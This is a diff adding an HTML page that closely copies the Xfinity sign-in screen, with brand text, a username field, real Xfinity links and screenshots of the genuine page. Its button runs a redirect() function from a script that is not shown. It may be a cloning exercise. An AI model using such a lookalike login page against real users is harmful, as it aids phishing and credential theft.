@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.css"/>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="img/images (1).png" type="image/x-icon">
+    <title>Sign in to Xfinity</title>
+</head>
+<body class="bg-[#FFFFFF]">
+    <div class="">
+        <div class="flex flex-col lg:flex-row md:gap-10 items-center justify-center md:justify-between">
+            <div class="md:w-1/2 px-6 lg:px-16 pt-10 xl:px-36">
+                <h1 class="text-2xl font-serif mx-auto font-semibold text-gray-400">Xfinity</h1>
+                <form action="" class="pt-10" id="form">
+                    <div>
+                        <h2 class=" text-3xl font-semibold">Sign in with your Xfinity ID</h2>
+                        <div class="mt-5">
+                            <input type="text" id="email" placeholder="Email, mobile, or username" class="focus:outline-none focus:ring-1 ring-[#5A23B9] border w-full bg-gray-200 p-4 rounded-md" required>
+                            <p class="pt-2 text-sm">By signing in, you agree to our <span class="text-[#5A23B9]"><a href="https://www.xfinity.com/terms/web">Terms of Service</a></span> and <span class="text-[#5A23B9]"><a href="https://www.xfinity.com/privacy/">Privacy Policy</a></span> .</p>
+                        </div>
+
+                        <div class="mt-8">
+                            <button onclick="redirect()" class="bg-[#5A23B9] px-7 rounded-md py-3 text-white font-semibold text-lg cursor-pointer">Let's go</button>
+                        </div>
+                    </div>
+                </form>
+
+                <div class="pt-6 flex flex-col gap-2">
+                <div class="hover:bg-gray-200 ease-in-out duration-300 p-2 border-b-1 border-gray-300">
+                   <a href="https://www.xfinity.com/planbuilder?localize=true&intcmp=ILC%3AACQ%3ABAUP%3ANON%3AGEN%3AGEN%3ACOM%3ANA%3Aand%3A6211652102">
+                    <span class=" flex justify-between">
+                    <p>New to Xfinity? View exclusive offers near you</p>
+                    <i class="ri-arrow-drop-right-line text-2xl"></i>
+                    </span>
+                    </a> 
+                </div>
+                <div class="hover:bg-gray-200 ease-in-out duration-300 p-2 border-b-1 border-gray-300">
+                    <a href="https://idm.xfinity.com/myaccount/lookup?execution=e1s1">
+                    <span class="flex justify-between">
+                    <p>Find your Xfinity ID</p>
+                    <i class="ri-arrow-drop-right-line text-2xl"></i>
+                    </span>
+                    </a>
+                </div>
+
+                <div class="hover:bg-gray-200 ease-in-out duration-300 p-2 border-b-1 border-gray-300">
+                    <a href="https://idm.xfinity.com/myaccount/create-uid?execution=e2s1">
+                    <span class="flex justify-between">
+                        <p>Create a new Xfinity ID </p>
+                        <i class="ri-arrow-drop-right-line text-2xl"></i>
+                    </span>
+                    </a>
+                </div>
+            </div>
+            </div>
+
+            <div class="mt-2 lg:mt-0 lg:w-1/2 mx-auto lg:pt-0 lg:px-0 lg:h-full px-6">
+                <a href="https://www.xfinity.com/learn/mobile/plan/savings-calculator/?cmp=PWS:ACQ:BAUP:NON:GEN:XFM:COM:NA:syd:41411116785">
+                <img src="img/Sign-in-to-Xfinity-05-21-2025_02_27_PM.png" alt="" class="lg:hidden">
+                <img src="img/Sign-in-to-Xfinity-05-21-2025_02_12_PM.png" alt="" class="hidden lg:block">
+                </a>
+            </div>
+        </div>
+
+        <div class="flex items-center justify-center px-8 xl:hidden pt-6">
+            <span class="text-gray-400 text-sm flex space-x-2">
+                <i class="ri-copyright-line"></i>
+                <p>2025 Comcast</p>
+            </span>
+        </div>
+         
+        <div class="grid md:max-w-xl mx-auto xl:max-w-none md:grid-cols-3 xl:grid-cols-7 justify-items-center mb-10 px-6 mt-6 gap-6">
+            
+            <span class="text-gray-400 text-sm xl:flex space-x-2 hidden ">
+                <i class="ri-copyright-line"></i>
+                <p>2025 Comcast</p>
+            </span>
+        
+            <span class="flex space-x-2 md:ml-4 text-nowrap text-sm">
+                <i class="ri-pages-line"></i>
+                <p class="cursor-pointer"><a href="https://www.xfinity.com/terms">Web Terms of Service</a></p>
+            </span>
+
+            <span class="flex space-x-2 text-sm text-nowrap">
+                <i class="ri-file-search-line"></i>
+                <p class="cursor-pointer"><a href="https://www.xfinity.com/privacy/policy/staterights#california">CA Notice at Collection</a></p>
+            </span>
+
+            <span class="flex space-x-2 text-sm">
+                <i class="ri-git-repository-private-fill"></i>
+                <p class="cursor-pointer"><a href="https://www.xfinity.com/privacy/policy">Privacy Policy</a></p>
+            </span>
+
+            <span class="flex space-x-2 text-sm">
+                <i class="ri-dna-fill"></i>
+                <p class="cursor-pointer"><a href="https://www.xfinity.com/privacy/your-privacy-choices">Your Privacy Choices</a></p>
+            </span>
+
+            <span class="flex space-x-2 text-sm">
+                <i class="ri-hospital-fill"></i>
+                <p class="cursor-pointer"><a href="https://www.xfinity.com/privacy/policy/staterights#washington">Health Privacy Notice</a></p>
+            </span>
+            
+            <span class="flex space-x-2 text-sm">
+                <i class="ri-chat-upload-fill"></i>
+                <p class="cursor-pointer"><a href="https://www.xfinity.com/adinformation">Ad Choices</a></p>
+            </span>
+        </div>
+
+        <footer class="w-full left-0 bg-black mt-16 text-gray-300 px-6 ">
+            <p class="text-center xl:text-center ">
+            <i class="ri-thunderstorms-fill"></i>
+            Cookies Preferences
+            </p>
+        </footer>
+        
+    </div>
+
+    <script src="main.js"></script>
+</body>
+</html>
